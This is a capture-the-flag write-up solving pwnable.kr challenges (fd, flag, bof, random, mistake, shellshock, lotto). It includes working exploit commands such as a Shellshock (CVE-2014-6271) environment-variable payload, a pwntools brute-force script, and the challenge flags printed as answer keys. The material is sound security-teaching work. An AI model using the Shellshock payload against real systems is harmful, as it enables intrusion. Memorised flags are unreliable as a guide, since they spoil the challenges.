# fd [  file descriptor ] 
inside fd.c
```C
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
char buf[32];
int main(int argc, char* argv[], char* envp[]){
	if(argc<2){
		printf("pass argv[1] a number\n");
		return 0;
	}
	int fd = atoi( argv[1] ) - 0x1234;
	int len = 0;
	len = read(fd, buf, 32);
	if(!strcmp("LETMEWIN\n", buf)){
		printf("good job :)\n");
		system("/bin/cat flag");
		exit(0);
	}
	printf("learn about Linux file IO\n");
	return 0;

}
```
i'm using an easy detection technique that says ```if it was a vulnerable C code, recompile it```
<br>
and here is what i got..
```assembly
file.c: In function ‘main’:
file.c:12:8: warning: implicit declaration of function ‘read’; did you mean ‘fread’? [-Wimplicit-function-declaration]
  len = read(fd, buf, 32);
        ^~~~
        fread
```
so the key is to understand the read function..
<br>
the very first thing to know about the file descriptor is
```
 file descriptor 0 is the standard input 
 file descriptor 1 is the standard output
 file descriptor 2 is the standard error 
 ```
 more about ```read``` function..
 ```assembly
 NAME
       read - read from a file descriptor

SYNOPSIS
       #include <unistd.h>

       ssize_t read(int fd, void *buf, size_t count);
```
so all we have to do here is to change the ```buf``` value to ```LETMEWIN``` by reseting the ```fd``` variable to ```0```
<br>
so we can write to the ```buf``` using the standard input
<br>
on this line ```int fd = atoi( argv[1] ) - 0x1234;``` we can see that the program is converting our input from ```str``` to ```int```
<br>
using ```atoi``` function
```assembly
NAME
       atoi, atol, atoll - convert a string to an integer
```
then minus it from 0x1234 which is ```4660```
<br>
now go ahead and get the flag
 ```
fd@ubuntu:~$ ./fd 4660
LETMEWIN
good job :)
mommy! I think I know what a file descriptor is!!
fd@ubuntu:~$ 
```
```Flag : mommy! I think I know what a file descriptor is!! ```

# flag
UPX packed, unpack it..
```assembly 
┌─[root@parrot]─[~]
└──╼ #strings flag | tail
;dl]tpR
c3Rh
2B)=	
1\a}
_M]h
Upbrk
makBN
su`"]R
UPX!
UPX!
┌─[root@parrot]─[~]
└──╼ #upx -d flag
                       Ultimate Packer for eXecutables
                          Copyright (C) 1996 - 2017
UPX 3.94        Markus Oberhumer, Laszlo Molnar & John Reiser   May 12th 2017

        File size         Ratio      Format      Name
   --------------------   ------   -----------   -----------
    883745 <-    335288   37.94%   linux/amd64   flag

Unpacked 1 file.
```
using IDA pro..
![screenshot_20180712_180941](https://user-images.githubusercontent.com/22657154/42645760-893ca7ac-8607-11e8-8af8-c2501d4b0742.png)

```Flag : UPX...? sounds like a delivery service :)```

# bof
It was a classic & easy to exploit buffer overflow, nothing to explain 

![buf_at_u](https://user-images.githubusercontent.com/22657154/42649325-15a1da6e-8612-11e8-92ff-2ec8bf0f2d10.png)
![get_flag](https://user-images.githubusercontent.com/22657154/42649329-16da19be-8612-11e8-878a-686fc643550b.png)

```Flag : daddy, I just pwned a buFFer :) ```

# random 
```C
#include <stdio.h>

int main(){
  unsigned int random;
  random = rand();	// random value!

  unsigned int key=0;
  scanf("%d", &key);

  if( (key ^ random) == 0xdeadbeef ){
     printf("Good!\n");
     system("/bin/cat flag");
     return 0;
  }

  printf("Wrong, maybe you should try 2^32 cases.\n");
  return 0;
}
```
the program is generating a random value then do xor using it with our key
<br>
if the result was equal to ```0xdeadbeef``` we will get the flag
<br>
to get the right key we have to xor ```random``` with ```0xdeadbeef```
<br>
```assembly
0x5557cf4ae747      e8c4feffff     call sym.imp.rand       ; int rand(void)
0x5557cf4ae74c b    8945fc         mov dword [local_4h], eax               
```
- NOTE
```
since the rand function has no seed the value will be generated statically to 1804289383
```

so to get the random generated value just set a break point on the instruction after it and see the ```EAX``` value.

![randm](https://user-images.githubusercontent.com/22657154/42652718-ecced984-861b-11e8-879c-80c54a0c8d60.png)

```Flag : Mommy, I thought libc random is unpredictable...```

# mistake
```C
#include <stdio.h>
#include <fcntl.h>

#define PW_LEN 10
#define XORKEY 1

void xor(char* s, int len){
	int i;
	for(i=0; i<len; i++){
		s[i] ^= XORKEY;
	}
}

int main(int argc, char* argv[]){

	int fd;
	if(fd=open("password",O_RDONLY,0400) < 0){
		printf("can't open password %d\n", fd);
		return 0;
	} // fd = 0 [STDIN]

	printf("do not bruteforce...\n");
	sleep(time(0)%20);

	char pw_buf[PW_LEN+1]; // 10 chrs
	int len;       
	if(!(len=read(fd,pw_buf,PW_LEN) > 0)){ // read from STDIN and store input inside pw_buf
		printf("read error\n");
		close(fd);
		return 0;
	}

	char pw_buf2[PW_LEN+1]; // 10 chrs
	printf("input password : ");
	scanf("%10s", pw_buf2);

	// xor your input
	xor(pw_buf2, 10);

	if(!strncmp(pw_buf, pw_buf2, PW_LEN)){ // cmp first input to second input after being xored
		printf("Password OK\n");
		system("/bin/cat flag\n");
	}
	else{
		printf("Wrong Password\n");
	}

	close(fd);
	return 0;
}


```
As the hint suggested, there’s a mistake in operator priority. We know that comparision operator < is given higher priority than assignment operator =. 
<br>
And as we know, that open will return a non-negative integer representing the lowest numbered unused file descriptor, comparision will always fail and return 0. Then 0 is assigned to the fd variable. In addition, from the previous challenges, we know that file descriptor with value 0 is reserved for stdin.
<br>
program will copy the input from stdin to the ````pw_buf```. After that every character from the second input ```pw_buf2``` will be xored with ```1```, and lastly ```pw_buf``` will be compared with ```pw_buf2``` 
<br>
So if we find out combination where first character xored with the 1 will result in the second, we will be able to bypass the password check. I picked 1 and 0.
```assembly
>>> 1 ^ 1
0
```
```assembly
mistake@ubuntu:~$ ./mistake
do not bruteforce...
0000000000
input password : 1111111111
Password OK
```
![screenshot_20180713_145429](https://user-images.githubusercontent.com/22657154/42693293-5e9a7f5a-86b7-11e8-9bfa-5e3d4e0da3ed.png)

```Flag : Mommy, the operator priority always confuses me :(```

# Shellshock 
What this program does is pretty simple: it sets the values of his real/effective/set_user user and group id to the value of
<br>
his effective group id and then execute a vulnerable version of bash.
<br>
In order to exploit it we need to set an environment variable containing a function and the commands we want to execute:
```READ ABOUT SHELLSHOCK HERE: https://fedoramagazine.org/shellshock-how-does-it-actually-work/```
```assembly
shellshock@ubuntu:~$ export exploit_it="() { :; }; /bin/cat flag;"
shellshock@ubuntu:~$ ./shellshock 
only if I knew CVE-2014-6271 ten years ago..!!
```

``` Flag : only if I knew CVE-2014-6271 ten years ago..!! ```

# Lotto
```C
int match = 0, j = 0;
	for(i=0; i<6; i++){
		for(j=0; j<6; j++){
			if(lotto[i] == submit[j]){
				match++;
			}
		}
	}
```
this code will compare our 6 characters to each character in lotto, so if lotto was equal ```!"#$%&,``` and we enter ```######``` we got the flag.
<br>
but we have to exactly get ```match``` variable value equal  to 6 
<br>
so run the binary using the same input until you got the flag, and as the help menu says
```assembly
- nLotto Rule -
nlotto is consisted with 6 random natural numbers less than 46
...
```
make it less than ```46```

i used pwntools to get the flag.
```python
from pwn import *
proc = process("./lotto")
Starting local process './lotto'
Starting local process './lotto': Done
proc.recv()
while True:
   proc.sendline("1")
   proc.sendline("######")
   a = proc.recv()
   if "mom" in a:
      print(a)
      break
```
![screenshot at 2018-07-13 17-21-32](https://user-images.githubusercontent.com/22657154/42700778-6a396a68-86cd-11e8-89be-513db652bcc9.png)

```Flag : sorry mom... I FORGOT to check duplicate numbers... :( ```
 
